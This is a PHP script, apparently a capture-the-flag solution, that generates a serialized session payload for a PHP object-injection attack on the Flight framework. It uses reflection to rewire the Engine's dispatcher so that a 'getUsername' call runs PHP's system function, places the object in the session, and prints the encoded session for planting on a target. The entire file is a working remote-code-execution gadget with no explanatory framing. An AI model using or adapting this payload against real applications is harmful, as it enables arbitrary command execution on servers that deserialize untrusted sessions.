<?php

use flight\Engine;

include 'src/vendor/autoload.php';
include 'src/lib/class.album.php';
include 'src/lib/class.user.php';

function forceGet($obj, $prop)
{
    $reflection = new ReflectionClass($obj);
    $property = $reflection->getProperty($prop);
    $property->setAccessible(true);
    return $property->getValue($obj);
}

function forceSet($obj, $prop, $val)
{
    $reflection = new ReflectionClass($obj);
    $property = $reflection->getProperty($prop);
    $property->setAccessible(true);
    $property->setValue($obj, $val);
}

session_start();


$e = new Engine();
forceSet(forceGet($e, 'dispatcher'), 'events', ['getUsername' => 'system']);
forceSet(forceGet($e, 'dispatcher'), 'filters', []);
forceSet(forceGet($e, 'loader'), 'classes', []);
forceSet(forceGet($e, 'loader'), 'instances', []);
forceSet(forceGet($e, 'loader'), 'dirs', []);
$e = unserialize(serialize(($e)));
// $e->__destruct('id');

$_SESSION['GIF'] = 48763;
$_SESSION['user'] = $e;
echo session_encode();
